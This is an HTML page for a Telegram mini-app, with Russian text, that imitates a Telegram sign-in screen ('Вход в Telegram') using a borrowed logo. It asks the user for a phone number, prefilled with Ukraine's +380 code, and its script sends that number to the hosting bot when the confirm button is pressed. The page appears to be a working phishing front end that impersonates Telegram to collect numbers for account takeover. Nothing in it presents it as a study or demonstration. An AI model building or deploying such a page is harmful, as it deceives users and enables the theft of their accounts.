<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <title>Telegram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            background-color: #fff;
            width: 100vw;
        }

        .container {
            max-width: 360px; /* Увеличили ширину контейнера */
            width: 90vw; 
            padding: 20px; /* Увеличили отступы внутри контейнера */
            text-align: center;
            margin-top: 20px; /* Добавили небольшой отступ сверху */
        }

        .logo {
            width: 100px; /* Увеличили размер логотипа */
            height: 100px;
            margin: 20px auto; /* Увеличили отступы вокруг логотипа */
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo img {
            width: 100%;
            height: 100%;
        }

        h2 {
            font-size: 30px; /* Увеличили размер заголовка */
            color: #333;
            margin: 20px 0; /* Увеличили отступы вокруг заголовка */
        }

        p {
            font-size: 18px; /* Увеличили размер текста */
            color: #888;
            margin-bottom: 20px; /* Увеличили отступ снизу текста */
        }

        .input-group {
            margin-bottom: 20px; /* Увеличили отступы между группами ввода */
            text-align: left;
        }

        label {
            font-size: 16px; /* Увеличили размер шрифта для меток */
            color: #888;
            display: block;
            margin-bottom: 8px; /* Увеличили отступ снизу меток */
        }

        select, input[type="text"] {
            width: 100%;
            padding: 14px; /* Увеличили высоту полей ввода */
            font-size: 20px; /* Увеличили размер текста в полях */
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            appearance: none;
        }

        .btn {
            width: 100%;
            padding: 16px; /* Увеличили высоту кнопки */
            background-color: #0088cc;
            color: #fff;
            font-size: 20px; /* Увеличили размер шрифта кнопки */
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn:hover {
            background-color: #006e9d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS61dA_KyDfVQmA4cuspw1GRX-AOvk2i8Tslw&s" alt="Telegram Logo">
        </div>
        <h2>Вход в Telegram</h2>
        <p>Пожалуйста введите ваш номер телефона и нажмите подтвердить.</p>
        
        <div class="input-group">
            <label for="country">Страна</label>
            <select id="country">
                <option>Украина</option>
                <option>США</option>
                <option>Англия</option>
                <!-- Add more countries as needed -->
            </select>
        </div>
        
        <div class="input-group">
            <label for="phone">Телефонный номер</label>
            <input type="text" id="phone" placeholder="+380 ___ ___ ___" value="+380">
        </div>
        
        <!-- <button class="btn">Подтвердить</button> -->
    </div>
    <script>
        let tg = window.Telegram.WebApp; // получаем объект webapp телеграма 
        tg.expand();
    
        // Настройка основной кнопки
        tg.MainButton.setText("Подтвердить"); 
        tg.MainButton.textColor = "#FFFFFF"; 
        tg.MainButton.color = "#0088cc"; 
        tg.MainButton.setParams({"color": "#006e9d"});
        tg.MainButton.show(); 
        tg.MainButton.enable(); 
    
        Telegram.WebApp.onEvent('mainButtonClicked', function() {
            // Получаем значение из поля input с id phone
            let phoneValue = document.getElementById('phone').value; 
            // Отправляем значение на бота
            tg.sendData(phoneValue); 
        });
    </script>
    
</body>
</html>
